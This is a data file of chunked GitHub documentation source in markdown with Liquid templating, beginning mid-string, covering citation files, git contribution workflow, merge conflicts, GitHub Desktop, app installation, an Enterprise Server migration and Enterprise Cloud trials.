\"https://", "Y2h1bmtfMl9pbmRleF8xNzUx": "orcid.org/0000-0000-0000-0000\"\n  - family-names: \"Bot\"\n    given-names: \"Hew\"\n    orcid: \"https://orcid.org/0000-0000-0000-0000\"\n  doi: \"10.0000/00000\"\n  journal: \"Journal Title\"\n  month: 9\n  start: 1 # First page number\n  end: 10 # Last page number\n  title: \"My awesome research software\"\n  issue: 1\n  volume: 1\n  year: 2021\n```\n\nThe example `CITATION.cff` file above will produce the following outputs in the {% data variables.product.company_short %} citation prompt:\n\n**APA**\n\n```text\nLisa, M., & Bot, H. (2021). My awesome research software. Journal Title, 1(1), 1. https://doi.org/10.0000/00000\n```\n\n**BibTeX**\n\n{% raw %}\n\n```text\n@article{Lisa_My_awesome_research_2021,\n  author = {Lisa, Mona and Bot, Hew},\n  doi = {10.0000/00000},\n  journal = {Journal Title},\n  month = {9},\n  number = {1},\n  pages = {1--10},\n  title = {{My awesome research software}},\n  volume = {1},\n  year = {2021}\n}\n```\n\n{% endraw %}\n\n\n\nCiting a dataset\n\nIf your repository contains a dataset, you can set `type: dataset` at the top level of your `CITATION.cff` file to produce a data citation string output in the {% data variables.product.prodname_dotcom %} citation prompt.\n\n\n\nOther citation files\n\nThe {% data variables.product.company_short %} citation feature will also detect a small number of additional files that are often used by communities and projects to describe how they would like their work to be cited.\n\n{% data variables.product.company_short %} will link to these files in the _Cite this repository_ prompt, but will not attempt to parse them into other citation formats.\n\n```text\n\n\nNote these are case-insensitive and must be in the root of the repository\nCITATION\nCITATIONS\nCITATION.bib\nCITATIONS.bib\nCITATION.md\nCITATIONS.md\n\n\n\nCITATION files for R packages are typically found at inst/CITATION\ninst/CITATION\n```\n\n\n\nCitation formats\n\nWe currently support APA and BibTeX file formats.\n\nAre you looking for additional citation formats? {% data variables.product.company_short %} uses a Ruby library, to parse the `CITATION.cff` files. You can re", "Y2h1bmtfM19pbmRleF8xNzUx": "quest additional formats in the ruby-cff repository, or contribute them yourself.\n\n", "Y2h1bmtfMF9pbmRleF8xMzU0": "\n\nAbout interfaces\n\nInterfaces serve as parent objects from which other objects can inherit.\n\nFor example, `Lockable` is an interface because both `Issue` and `PullRequest` objects can be locked. An interface has its own list of named fields that are shared by implementing objects.\n\nFor more information, see \"AUTOTITLE.\"\n\n{% data reusables.projects.graphql-ghes %}\n\n\n\n", "Y2h1bmtfMF9pbmRleF8xOTg5": "---\ntitle: Users\nintro: >-\n  Use the REST API to get public and private information about authenticated\n  users.\nversions: # DO NOT MANUALLY EDIT. CHANGES WILL BE OVERWRITTEN BY A \ud83e\udd16\n  fpt: '*'\n  ghae: '*'\n  ghec: '*'\n  ghes: '*'\ntopics:\n  - API\nautogenerated: rest\n---\n\n\n\n\n\n", "Y2h1bmtfMF9pbmRleF8xOTI4": "---\ntitle: Community metrics\nshortTitle: Community\nallowTitleToDifferFromFilename: true\nintro: Use the REST API to retrieve information about your community profile.\nversions: # DO NOT MANUALLY EDIT. CHANGES WILL BE OVERWRITTEN BY A \ud83e\udd16\n  fpt: '*'\n  ghec: '*'\ntopics:\n  - API\nautogenerated: rest\n---\n\n\n\n\n\n", "Y2h1bmtfMF9pbmRleF80Njk=": "\n\nFurther reading\n\n- \"AUTOTITLE\"\n\n", "Y2h1bmtfMF9pbmRleF8xMTgx": "\n\nAbout notifications in {% data variables.product.prodname_desktop %}\n\n{% data variables.product.prodname_desktop %} will show a system notification for events that occur in the currently selected repository. Notifications will be shown when:\n\n- Pull request checks have failed.\n- A pull request review is left with a comment, approval, or requested changes.\n\nClicking the notification will switch application focus to {% data variables.product.prodname_desktop %} and provide more detailed information.\n\n\n\nNotifications about pull request check failures\n\nWhen changes are made to a pull request branch, you will receive a system notification if the checks fail.\n\nClicking the notification will display a dialog with details about the checks. Once you've reviewed why the checks have failed, you can re-run the checks, or quickly switch to the pull request branch to get started on fixing the errors. For more information, see \"AUTOTITLE.\"\n\n\n\nNotifications for pull request reviews\n\n{% data variables.product.prodname_desktop %} will surface a system notification when a teammate has approved, commented, or requested changes in your pull request. See \"AUTOTITLE\" for more information on pull request reviews.\n\nClicking the notification will switch application focus to {% data variables.product.prodname_desktop %} and provide more context for the pull request review comment.\n\n\n\nEnabling notifications\n\nIf system notifications are disabled for {% data variables.product.prodname_desktop %} you can follow the steps below to enable them.\n\n{% mac %}\n\n{% data reusables.desktop.mac-select-desktop-menu %}\n1. In the \"Preferences\" window, on the \"Notifications\" pane, select **Enable notifications**.\n1. In the \"Enable notifications\" description field, click the **Notification Settings** link to open the \"Notifications\" pane in the macOS \"System Settings\" window.\n1. In the \"Application Notifications\" list, select **{% data variables.product.prodname_desktop %}**.\n1. Click **Allow Notifications**.\n\nFor more information about macOS system notific", "Y2h1bmtfMV9pbmRleF8xMTgx": "ations, see \"Use notifications on your Mac.\"\n\n{% endmac %}\n\n{% windows %}\n\n{% data reusables.desktop.windows-choose-options %}\n1. In the \"Options\" windows, on the \"Notifications\" pane, select **Enable notifications**.\n1. In the \"Enable notifications\" description field, click the **Notification Settings** link to open the \"Notifications\" pane in the Windows \"Settings\" window.\n1. Under \"Notifications\", to enable notifications for Windows, click **On**.\n1. Under \"Notifications from apps and other senders\", find \"{% data variables.product.prodname_desktop %}\" in the application list and click **On**.\n\nFor more information about Windows system notifications, see \"Change notification settings in Windows.\"\n\n{% endwindows %}\n\n", "Y2h1bmtfMF9pbmRleF8xMDg1": "\n\nSetting up your topic branch and making changes\n\nTo keep your local branches in sync with their remotes and avoid merge conflicts, follow these steps as you work on documentation.\n\n1. In the terminal, change the current working directory to the location where you cloned the documentation repository. For example:\n\n   ```shell\n   cd ~/my-cloned-repos/docs\n   ```\n\n1. Switch to the default branch: `main`.\n\n   ```shell\n   git checkout main\n   ```\n\n1. Get the most recent commits from the remote repository.\n\n   ```shell\n   git pull origin main\n   ```\n\n1. Switch to or create a topic branch.\n   - To start a new project, create a new topic branch from `main`.\n\n     ```shell\n     git checkout -b YOUR-TOPIC-BRANCH\n     ```\n\n     {% note %}\n\n     **Note**: You can use forward slashes as part of the branch name, for example to include your user name:\n\n     ```shell\n     git checkout -b my-username/new-codespace-policy\n     ```\n\n     {% endnote %}\n\n   - To work on an existing project, switch to your topic branch and merge changes from `main`.\n\n     ```shell\n     git checkout YOUR-TOPIC-BRANCH\n     git merge main\n     ```\n\n     If you run into merge conflicts, follow the steps later in this article for resolving merge conflicts.\n\n1. Open your preferred text editor, edit files as required, then save your changes.\n\n\n\nCommitting and pushing your changes\n\n1. When you're ready to commit your changes, open a terminal and check the status of your topic branch with `git status`. Make sure you see the correct set of changes.\n\n   ```shell\n   git status\n   On branch YOUR-TOPIC-BRANCH\n\n   Changes not staged for commit:\n     (use \"git add ...\" to update what will be committed)\n     (use \"git checkout -- ...\" to discard changes in working directory)\n           deleted:    example-deleted-file.md\n           modified:   example-changed-file.md\n\n   Untracked files:\n     (use \"git add ...\" to include in what will be committed)\n           example-new-file.md\n   ```\n\n1. Stage the changed files so that they're ready to be committed to your topic b", "Y2h1bmtfMV9pbmRleF8xMDg1": "ranch.\n\n   - If you created new files or updated existing files, use `git add FILENAME [FILENAME...]`. For example:\n\n     ```shell\n     git add example-new-file.md example-changed-file.md\n     ```\n\n     This adds the updated version of the files to Git's staging area, from which changes can be committed. To unstage a file, use `git reset HEAD FILENAME`. For example, `git reset HEAD example-changed-file.md`.\n\n   - If you deleted files, use `git rm FILENAME [FILENAME...]`. For example:\n\n     ```shell\n     git rm example-deleted-file.md\n     ```\n\n1. Commit your changes.\n\n   ```shell\n   git commit -m \"Commit message title (max 72 characters)\n   \n   Optional fuller description of what changed (no character limit). \n   Note the empty line between the title and the description, \n   and the closing quotation mark at the end of the commit message.\"\n   ```\n\n   This commits the staged changes locally. You can now push this commit, and any other unpushed commits, to the remote repository.  \n\n   To remove this commit, use `git reset --soft HEAD~1`. After running this command our changes are no longer committed but the changed files remain in the staging area. You can make further changes and then `add` and `commit` again.\n\n1. Push your changes to the remote repository on {% data variables.product.prodname_dotcom_the_website %}.\n\n   - The first time you push your branch you can choose to add an upstream tracking branch. This allows you to use `git pull` and `git push` on that branch without additional arguments.\n\n     ```shell\n     git push --set-upstream origin YOUR-TOPIC-BRANCH\n     ```\n\n   - If you've pushed this branch before, and set an upstream tracking branch you can use:\n\n     ```shell\n     git push\n     ```\n\n\n\nBest practices for commits\n\n- Favor commits that contain small, focused groups of changes over commits with large, unfocused groups of changes, since this will help you write commit messages that other people can easily understand. An exception is the initial commit for a new project or category. These commits a", "Y2h1bmtfMl9pbmRleF8xMDg1": "re sometimes large, as they often introduce the bare versions of many articles at once to provide an organizational scheme for subsequent work.\n- If you are incorporating feedback or want to address a set of changes to a particular person or team for review, @mention the person whose suggestions you are incorporating. For example: \"Incorporating feedback from @octocat,\" or \"Updating billing configuration steps - cc @monalisa for accuracy.\"\n- If a commit addresses an issue, you can reference the issue number in the commit, and a link to the commit will appear in the issue conversation timeline: \"Addresses #1234 - adds steps for backing up the VM before upgrading.\"\n  {% note %}\n\n  **Note**: We generally don't close an issue via a commit. To close an issue, open a pull request and add \"Closes #1234\" to the description. The linked issue will be closed when the pull request is merged. For more information, see \"AUTOTITLE.\"\n\n  {% endnote %}\n- Make commit messages clear, detailed, and imperative. For example: \"Adds a conceptual article about 2FA,\" not \"Add info.\"\n- Try not to leave uncommitted changes in your local branch when you finish working for the day. Get to a good stopping point and commit and push your changes so your work is backed up to the remote repository.\n- Only push up to {% data variables.product.prodname_dotcom_the_website %} after you've made a few commits. Pushing after every commit adds noise to our ops channels on Slack and causes unnecessary builds to run.\n\n\n\nResolving merge conflicts\n\nWhen you try to merge two branches that contain different changes to the same part of a file, you will get a merge conflict. In our workflow, this most often occurs when merging `main` down into a local topic branch.\n\nThere are two ways to handle merge conflicts:\n- Edit the file in your text editor and choose which changes to keep. Then commit the updated file to your topic branch from the command line.\n- Resolve the merge conflicts on {% data variables.product.prodname_dotcom_the_website %}.\n\n\n\nResolving merge conf", "Y2h1bmtfM19pbmRleF8xMDg1": "licts by editing the file and committing the changes\n\n1. On the command line, note the files that contains merge conflicts.\n1. Open the first of these files in your text editor.\n1. In the file, look for the merge conflict markers.\n\n   ```text\n    <<<<<<< HEAD\n    Here are the changes you've made.\n    =====================\n    Here are the changes from the main branch.\n    >>>>>>> main\n   ```\n\n1. Decide which changes to keep and delete the unwanted changes and the merge conflict markers. If you need to make further changes, you can do so at the same time. For example, you could change the five lines shown in the previous code sample to the single line:\n\n   ```text\n   Here are the changes you want to use.\n   ```\n\n   If there are multiple files with merge conflicts, repeat the previous steps until you resolve all conflicts.\n\n   {% note %}\n\n   **Note**: You should apply care when resolving merge conflicts. Sometimes you will simply accept your own changes, sometimes you will use the upstream changes from the `main` branch, and sometimes you will combine both sets of changes. If you're unsure of the best resolution, be wary of replacing the changes from upstream as these may have been made for specific reasons that you're not aware of.\n\n   {% endnote %}\n\n1. In the terminal, stage the file, or files, that you just modified.\n\n   ```shell\n   git add changed-file-1.md changed-file-2.md\n   ```\n\n1. Commit the files.\n\n   ```shell\n   git commit -m \"Resolves merge conflicts\"\n   ```\n\n1. Push the committed changes to the remote repository on {% data variables.product.prodname_dotcom_the_website %}.\n\n   ```shell\n   git push\n   ```\n\n\n\nCreating a pull request\n\nWe recommend you open your pull request on {% data variables.product.prodname_dotcom %} early. Create the pull request as a draft until you are ready for it to be reviewed. Each time you push changes, your commits will be added to the pull request.\n\n{% note %}\n\n**Note**: You can quickly access pull requests you've created by clicking **Pull requests** at the top of every page", "Y2h1bmtfNF9pbmRleF8xMDg1": " on {% data variables.product.prodname_dotcom_the_website %}.\n\n{% endnote %}\n\nFor more information, see \"AUTOTITLE.\"\n\n", "Y2h1bmtfMF9pbmRleF8xNTUx": "---\ntitle: Restricting repository creation in your organization\nintro: 'To protect your organization''s data, you can configure permissions for creating repositories in your organization.'\nredirect_from:\n  - /articles/restricting-repository-creation-in-your-organization\n  - /github/setting-up-and-managing-organizations-and-teams/restricting-repository-creation-in-your-organization\nversions:\n  fpt: '*'\n  ghes: '*'\n  ghae: '*'\n  ghec: '*'\ntopics:\n  - Organizations\n  - Teams\nshortTitle: Restrict repository creation\n---\n\nYou can choose whether members can create repositories in your organization. {% ifversion ghec or ghes or ghae %}If you allow members to create repositories, you can choose which types of repositories members can create.{% elsif fpt %}If you allow members to create repositories, you can choose whether members can create both public and private repositories or public repositories only.{% endif %} Organization owners can always create any type of repository.\n\n{% ifversion fpt %}\nOrganizations using {% data variables.product.prodname_ghe_cloud %} can also restrict members to creating private repositories only. For more information, see the {% data variables.product.prodname_ghe_cloud %} documentation.\n{% endif %}\n\n{% ifversion ghec or ghae or ghes %}\nEnterprise owners can restrict the options you have available for your organization's repository creation policy. For more information, see \"AUTOTITLE.\"\n{% endif %}\n\n{% ifversion fpt or ghec or ghes %}\nOrganization owners can restrict the type of repositories members can create to private {% ifversion ghec or ghes %}or internal{% endif %} to help prevent sensitive information from being exposed. For more information, see \"AUTOTITLE.\"\n{% endif %}\n\n{% warning %}\n\n**Warning**: This setting only restricts the visibility options available when repositories are created and does not restrict the ability to change repository visibility at a later time. For more information about restricting changes to existing repositories' visibilities, see \"AUTOTITLE.\"\n\n{% endwar", "Y2h1bmtfMV9pbmRleF8xNTUx": "ning %}\n\n{% data reusables.profile.access_org %}\n{% data reusables.profile.org_settings %}\n{% data reusables.organizations.member-privileges %}\n1. Under \"Repository creation\", select one or more options. \n\n   {% ifversion fpt or ghec %}\n   {% note %}\n\n   **Note:** To restrict members to creating private repositories only, your organization must use {% data variables.product.prodname_ghe_cloud %}. {% data reusables.enterprise.link-to-ghec-trial %}\n\n   {% endnote %}\n   {%- endif %}\n\n1. Click **Save**.\n\n", "Y2h1bmtfMF9pbmRleF8xMTUw": "\n\nAbout local repositories\n\nRepositories on {% data variables.product.prodname_dotcom %} are remote repositories. You can clone or fork a repository with {% data variables.product.prodname_desktop %} to create a local repository on your computer.\n\nYou can create a local copy of any repository on {% data variables.product.product_name %} that you have access to by cloning the repository. If you own a repository or have write permissions, you can sync between the local and remote locations. For more information, see \"AUTOTITLE.\"\n\nWhen you clone a repository, any changes you push to {% data variables.product.product_name %} will affect the original repository. To make changes without affecting the original project, you can create a separate copy by forking the repository. You can create a pull request to propose that maintainers incorporate the changes in your fork into the original upstream repository. For more information, see \"AUTOTITLE.\"\n\nWhen you try to use {% data variables.product.prodname_desktop %} to clone a repository that you do not have write access to, {% data variables.product.prodname_desktop %} will prompt you to create a fork automatically. You can choose to use your fork to contribute to the original upstream repository or to work independently on your own project. Any existing forks default to contributing changes to their upstream repositories. You can modify this choice at any time. For more information, see \"Managing fork behavior\".\n\nYou can also clone a repository directly from {% data variables.product.prodname_dotcom %} or {% data variables.product.prodname_enterprise %}. For more information, see \"AUTOTITLE\".\n\n\n\nCloning a repository\n\n{% data reusables.desktop.choose-clone-repository %}\n{% data reusables.desktop.cloning-location-tab %}\n{% data reusables.desktop.cloning-repository-list %}\n{% data reusables.desktop.choose-local-path %}\n{% data reusables.desktop.click-clone %}\n\n\n\nForking a repository\n\nYou can fork a repository on {% data variables.product.prodname_dotcom_the_website %} or in {", "Y2h1bmtfMV9pbmRleF8xMTUw": "% data variables.product.prodname_desktop %}. For information about forking on {% data variables.product.prodname_dotcom_the_website %}, see \"AUTOTITLE.\"\n\n{% data reusables.desktop.forking-a-repo %}\n\n\n\nManaging fork behavior\n\nYou can change how a fork behaves with the upstream repository in {% data variables.product.prodname_desktop %}.\n\n{% data reusables.desktop.open-repository-settings %}\n{% data reusables.desktop.select-fork-behavior %}\n\n\n\nCreating an alias for a local repository\n\nYou can create an alias for a local repository to help differentiate between repositories of the same name in {% data variables.product.prodname_desktop %}. Creating an alias does not affect the repository's name on {% data variables.product.prodname_dotcom %}. In the repositories list, aliases appear in italics.\n\n1. In the upper-left corner of {% data variables.product.prodname_desktop %}, to the right of the current repository name, click {% octicon \"triangle-down\" aria-label=\"The triangle-down icon\" %}.\n1. Right-click the repository you want to create an alias for, then click **Create Alias**.\n1. Type an alias for the repository.\n1. Click **Create Alias**.\n\n\n\nFurther reading\n\n- About remote repositories\n\n", "Y2h1bmtfMF9pbmRleF8xNjYz": "\n\nResolving merge conflicts\n\nTo resolve a merge conflict, you must manually edit the conflicted file to select the changes that you want to keep in the final merge. There are a couple of different ways to resolve a merge conflict:\n\n- If your merge conflict is caused by competing line changes, such as when people make different changes to the same line of the same file on different branches in your Git repository, you can resolve it on {% data variables.product.product_name %} using the conflict editor. For more information, see \"AUTOTITLE.\"\n- For all other types of merge conflicts, you must resolve the merge conflict in a local clone of the repository and push the change to your branch on {% data variables.product.product_name %}. You can use the command line or a tool like {% data variables.product.prodname_desktop %} to push the change. For more information, see  \"AUTOTITLE.\"\n\nIf you have a merge conflict on the command line, you cannot push your local changes to {% data variables.product.product_name %} until you resolve the merge conflict locally on your computer. If you try merging branches on the command line that have a merge conflict, you'll get an error message. For more information, see \"AUTOTITLE.\"\n\n```shell\n$ git merge BRANCH-NAME\n> Auto-merging styleguide.md\n> CONFLICT (content): Merge conflict in styleguide.md\n> Automatic merge failed; fix conflicts and then commit the result\n```\n\n\n\nFurther reading\n\n- \"AUTOTITLE\"\n- \"AUTOTITLE\"\n- \"AUTOTITLE\"\n- \"AUTOTITLE\"\n\n", "Y2h1bmtfMF9pbmRleF81NzQ=": "\n\nAbout installing your own {% data variables.product.prodname_github_app %}\n\nOnce you create a {% data variables.product.prodname_github_app %}, you can install it. If your {% data variables.product.prodname_github_app %} is owned by a personal account{% ifversion ghec%} and you are not an {% data variables.product.prodname_emu %}{% endif %}, you can install it on your account. If your {% data variables.product.prodname_github_app %} is owned by an organization and you are an organization owner, you can install it on the organization.\n\n{% ifversion fpt or ghec %}\nIf your {% data variables.product.prodname_github_app %} is public{% ifversion ghec%} and you are not an {% data variables.product.prodname_emu %}{% endif %}, you can also share your {% data variables.product.prodname_github_app %} with other users or organizations. {% ifversion ghec%}If you are an {% data variables.product.prodname_emu %}, then you can only share your app with other organizations within your enterprise.{% endif %}For more information, see \"AUTOTITLE.\"\n{% else %}\nIf your {% data variables.product.prodname_github_app %} is public, you can also share your {% data variables.product.prodname_github_app %} with other users or organizations within your enterprise. For more information, see \"AUTOTITLE.\"\n{% endif %}\n\n\n\nInstalling your own {% data variables.product.prodname_github_app %}\n\n{% data reusables.apps.settings-step %}\n{% data reusables.user-settings.developer_settings %}\n{% data reusables.user-settings.github_apps %}\n1. Next to the {% data variables.product.prodname_github_app %} that you want to install, click **Edit**.\n1. Click **Install App**.\n1. Click **Install** next to the location where you want to install the {% data variables.product.prodname_github_app %}.\n1. If the app requires repository permissions, select **All repositories** or **Only select repositories**. The app will always have at least read-only access to all public repositories on {% data variables.product.company_short %}.\n\n   If the app does not require repositor", "Y2h1bmtfMV9pbmRleF81NzQ=": "y permissions, these options will be omitted.\n1. If you selected **Only select repositories** in the previous step, under the **Select repositories** dropdown, select the repositories that you want the app to access.\n\n   If the app creates any repositories, the app will automatically be granted access to those repositories as well.\n1. Click **Install**.\n\n", "Y2h1bmtfMF9pbmRleF80NDQ=": "\n\nPrepare for the migration\n\n1. Review the Provisioning and Installation guide and check that all prerequisites needed to provision and configure {% data variables.product.prodname_enterprise %} 2.1.23 in your environment are met. For more information, see \"Provisioning and Installation.\"\n1. Verify that the current instance is running a supported upgrade version.\n1. Set up the latest version of the {% data variables.product.prodname_enterprise_backup_utilities %}. For more information, see {% data variables.product.prodname_enterprise_backup_utilities %}.\n    - If you have already configured scheduled backups using {% data variables.product.prodname_enterprise_backup_utilities %}, make sure you have updated to the latest version.\n    - If you are not currently running scheduled backups, set up {% data variables.product.prodname_enterprise_backup_utilities %}.\n1. Take an initial full backup snapshot of the current instance using the `ghe-backup` command. If you have already configured scheduled backups for your current instance, you don't need to take a snapshot of your instance.\n\n   {% tip %}\n\n   **Tip:** You can leave the instance online and in active use during the snapshot. You'll take another snapshot during the maintenance portion of the migration. Since backups are incremental, this initial snapshot reduces the amount of data transferred in the final snapshot, which may shorten the maintenance window.\n\n   {% endtip %}\n\n1. Determine the method for switching user network traffic to the new instance. After you've migrated, all HTTP and Git network traffic directs to the new instance.\n    - **DNS** - We recommend this method for all environments, as it's simple and works well even when migrating from one datacenter to another. Before starting migration, reduce the existing DNS record's TTL to five minutes or less and allow the change to propagate. Once the migration is complete, update the DNS record(s) to point to the IP address of the new instance.\n    - **IP address assignment** - This method is only availab", "Y2h1bmtfMV9pbmRleF80NDQ=": "le on VMware to VMware migration and is not recommended unless the DNS method is unavailable. Before starting the migration, you'll need to shut down the old instance and assign its IP address to the new instance.\n1. Schedule a maintenance window. The maintenance window should include enough time to transfer data from the backup host to the new instance and will vary based on the size of the backup snapshot and available network bandwidth. During this time your current instance will be unavailable and in maintenance mode while you migrate to the new instance.\n\n\n\nPerform the migration\n\n1. Provision a new {% data variables.product.prodname_enterprise %} 2.1 instance. For more information, see the \"Provisioning and Installation\" guide for your target platform.\n1. In a browser, navigate to the new replica appliance's IP address and upload your {% data variables.product.prodname_enterprise %} license.\n1. Set an admin password.\n1. Click **Migrate**.\n1. In the \"Add new SSH key\" text field, paste your backup host access SSH key.\n1. Click **Add key** and then click **Continue**.\n1. Copy the `ghe-restore` command that you'll run on the backup host to migrate data to the new instance.\n1. Enable maintenance mode on the old instance and wait for all active processes to complete. For more information, see \"AUTOTITLE.\"\n\n   {% note %}\n\n   **Note:** The instance will be unavailable for normal use from this point forward.\n\n   {% endnote %}\n\n1. On the backup host, run the `ghe-backup` command to take a final backup snapshot. This ensures that all data from the old instance is captured.\n1. On the backup host, run the `ghe-restore` command you copied on the new instance's restore status screen to restore the latest snapshot.\n\n   ```shell\n   $ ghe-restore 169.254.1.1\n   The authenticity of host '169.254.1.1:122' can't be established.\n   RSA key fingerprint is fe:96:9e:ac:d0:22:7c:cf:22:68:f2:c3:c9:81:53:d1.\n   Are you sure you want to continue connecting (yes/no)? yes\n   Connect 169.254.1.1:122 OK (v2.0.0)\n   Starting restore of 169.2", "Y2h1bmtfMl9pbmRleF80NDQ=": "54.1.1:122 from snapshot 20141014T141425\n   Restoring Git repositories ...\n   Restoring GitHub Pages ...\n   Restoring asset attachments ...\n   Restoring hook deliveries ...\n   Restoring MySQL database ...\n   Restoring Redis database ...\n   Restoring SSH authorized keys ...\n   Restoring Elasticsearch indices ...\n   Restoring SSH host keys ...\n   Completed restore of 169.254.1.1:122 from snapshot 20141014T141425\n   Visit https://169.254.1.1/setup/settings to review appliance configuration.\n   ```\n\n1. Return to the new instance's restore status screen to see that the restore completed.\n1. Click **Continue to settings** to review and adjust the configuration information and settings that were imported from the previous instance.\n1. Click **Save settings**.\n\n   {% note %}\n\n   **Note:** You can use the new instance after you've applied configuration settings and restarted the server.\n\n   {% endnote %}\n\n1. Switch user network traffic from the old instance to the new instance using either DNS or IP address assignment.\n1. Upgrade to the latest patch release of {% data variables.product.prodname_ghe_server %}. For more information, see \"AUTOTITLE.\"\n\n", "Y2h1bmtfMF9pbmRleF8xMTIy": "\n\nAbout {% data variables.product.prodname_copilot_chat %}\n\n{% data variables.product.prodname_copilot_chat %} is a chat interface that lets you interact with {% data variables.product.prodname_copilot %}, to ask and receive answers to coding-related questions within {% data variables.product.prodname_dotcom_the_website %} and supported IDEs. The chat interface provides access to coding information and support without requiring you to navigate documentation or search online forums. {% data variables.product.prodname_copilot_chat_short %} is currently supported in {% data variables.product.prodname_vscode %}, {% data variables.product.prodname_vs %}, and the JetBrains suite of IDEs. {% ifversion ghec %}Users with a {% data variables.product.prodname_copilot_enterprise_short %} subscription can also use {% data variables.product.prodname_copilot_chat_dotcom %}.{% endif %} For more information about {% data variables.product.prodname_copilot %}, see \"AUTOTITLE\" and \"AUTOTITLE.\"{% ifversion ghec %} For more information about {% data variables.product.prodname_copilot_chat_dotcom %}, see \"AUTOTITLE.\"{% endif %}\n\n{% data variables.product.prodname_copilot_chat %} can answer a wide range of coding-related questions on topics including syntax, programming concepts, test cases, debugging, and more. {% data variables.product.prodname_copilot_chat %} is not designed to answer non-coding questions or provide general information on topics outside of coding.\n\n{% data variables.product.prodname_copilot_chat %} works by using a combination of natural language processing and machine learning to understand your question and provide you with an answer. This process can be broken down into a number of steps.\n\n{% data reusables.copilot.about-copilot-chat %}\n\n\n\nNext steps\n\nFor details of how to use {% data variables.product.prodname_copilot_chat %}, see:\n\n- \"AUTOTITLE\"\n- \"AUTOTITLE\"{% ifversion fpt %} in the {% data variables.product.prodname_ghe_cloud %} documentation.{% endif %}\n\n\n\nFurther reading\n\n- \"AUTOTITLE\"\n- {% data variables.", "Y2h1bmtfMV9pbmRleF8xMTIy": "product.prodname_copilot %} Trust Center\n\n", "Y2h1bmtfMF9pbmRleF8yNDE=": "---\ntitle: About supply chain security for your enterprise\nintro: You can enable features that help your developers understand and update the dependencies their code relies on.\nshortTitle: About supply chain security\npermissions: ''\nversions:\n  ghes: '*'\n  ghae: '*'\ntype: how_to\ntopics:\n  - Enterprise\n  - Security\n  - Dependency graph\n---\n\nYou can allow users to identify their projects' dependencies by {% ifversion ghes %}enabling{% elsif ghae %}using{% endif %} the dependency graph for {% data variables.location.product_location %}. For more information, see \"{% ifversion ghes %}Enabling the dependency graph for your enterprise{% elsif ghae %}About the dependency graph{% endif %}.\"\n\n{% data reusables.dependency-review.dependency-review-enabled-ghes %}\n\nYou can also allow users on {% data variables.location.product_location %} to find and fix vulnerabilities in their code dependencies by enabling {% data variables.product.prodname_dependabot_alerts %}{% ifversion ghes %} and {% data variables.product.prodname_dependabot_updates %}{% endif %}. For more information, see \"AUTOTITLE.\"\n\nAfter you enable {% data variables.product.prodname_dependabot_alerts %}, you can view vulnerability data from the {% data variables.product.prodname_advisory_database %} on {% data variables.location.product_location %} and manually sync the data. For more information, see \"AUTOTITLE.\"\n\n", "Y2h1bmtfMF9pbmRleF80NTk=": "\n\nAbout {% data variables.product.prodname_ghe_cloud %}\n\n{% data reusables.enterprise.about-ghec %} For more information, see \"AUTOTITLE.\"\n\nYou can set up a trial to evaluate the additional features that come with {% data variables.product.prodname_ghe_cloud %}, such as SAML single sign-on (SSO), internal repositories, audit log streaming, and included {% data variables.product.prodname_actions %} minutes. For a detailed list of the features available with {% data variables.product.prodname_ghe_cloud %}, see our Pricing page.\n\n\n\nAbout trials of {% data variables.product.prodname_ghe_cloud %}\n\nYou can set up a {% data reusables.copilot.trial-period %}-day trial to evaluate {% data variables.product.prodname_ghe_cloud %}. Your trial includes an enterprise account, which allows you to manage multiple organizations. For more information, see \"AUTOTITLE.\"\n\nDuring the trial, you can add up to three new organizations to your enterprise. There are no limitations on the number of existing organizations you can transfer to your enterprise. For existing organizations, billing is paused during the trial and any coupons are removed. To reapply a coupon, contact {% data variables.contact.contact_enterprise_sales %}. Organizations created during the trial cannot be removed from the enterprise account until after you purchase {% data variables.product.prodname_enterprise %}.\n\nYour trial also includes 50 seats. If you need more seats to evaluate {% data variables.product.prodname_ghe_cloud %}, contact {% data variables.contact.contact_enterprise_sales %}. At the end of the trial, you can choose a different number of seats, up to 1,000.\n\nYou do not need to provide a payment method during the trial.\n\n{% data reusables.saml.saml-accounts %}\n\n{% data reusables.enterprise.ghec-trial-azure %}\n\n\n\nFeatures not included in the trial\n\nThe following features are not included in the trial of {% data variables.product.prodname_ghe_cloud %}:\n\n- {% data variables.product.prodname_emus %}: If you're interested in {% data variables.product.prodna", "Y2h1bmtfMV9pbmRleF80NTk=": "me_emus %}, please contact {% data variables.product.prodname_dotcom %}'s Sales team.\n- {% data variables.product.prodname_github_codespaces %}\n- {% data variables.product.prodname_copilot_for_business %}\n- {% data variables.product.prodname_sponsors %}\n- Paid {% data variables.product.prodname_marketplace %} apps (free apps are supported as part of the trial)\n- {% data variables.product.prodname_github_connect %}\n- For {% data variables.product.prodname_actions %}, increased minutes, job concurrency, and {% data variables.actions.hosted_runner %}s\n- If you set up your own trial, access to {% data variables.product.prodname_ghe_server %} is not included. If you would like to use {% data variables.product.prodname_ghe_server %}, contact {% data variables.contact.contact_enterprise_sales %}.\n\nIf you invite an existing organization into your trial enterprise, all of these features will be disabled. If you remove the organization from the enterprise, the features will be re-enabled.\n\n\n\nSetting up your trial of {% data variables.product.prodname_ghe_cloud %}\n\nBefore you can try {% data variables.product.prodname_ghe_cloud %}, you must be signed into a personal account. If you don't already have a personal account on {% data variables.product.prodname_dotcom_the_website %}, you must create one. For more information, see \"AUTOTITLE.\"\n\n{% note %}\n\n**Note**: If your company has a Microsoft Enterprise Agreement, do not set up your trial manually. You must contact {% data variables.contact.contact_enterprise_sales %} to begin your trial and ensure the trial is connected to your Enterprise Agreement.\n\n{% endnote %}\n\n{% data reusables.enterprise.create-enterprise-account %}\n\n1. Follow the prompts to configure your trial.\n\n\n\nExploring {% data variables.product.prodname_ghe_cloud %}\n\nAfter you set up your trial, you can explore {% data variables.product.prodname_ghe_cloud %} by following the suggested tasks on the \"Getting started\" tab of your enterprise account.\n\n{% data reusables.docs.you-can-read-docs-for-your-product %}\n\n{%", "Y2h1bmtfMl9pbmRleF80NTk=": " data reusables.enterprise.best-practices %}\n\nDuring your trial, you can evaluate the extra security features that {% data variables.product.company_short %} offers to customers on {% data variables.product.prodname_enterprise %} by setting up a free trial of {% data variables.product.prodname_GH_advanced_security %}. {% data variables.product.prodname_GH_advanced_security %} is a separate license that gives you access to extra security features in private repositories in your enterprise, such as automatically scanning code for vulnerabilities and detecting leaked secrets. For more information, see \"AUTOTITLE.\"\n\n{% data reusables.products.product-roadmap %}\n\n\n\nFinishing your trial\n\nYou can finish your trial at any time by purchasing {% data variables.product.prodname_enterprise %} or canceling the trial. If you don't purchase {% data variables.product.prodname_enterprise %} or cancel your trial by the end of the 30 days, your trial will expire.\n\nPurchasing {% data 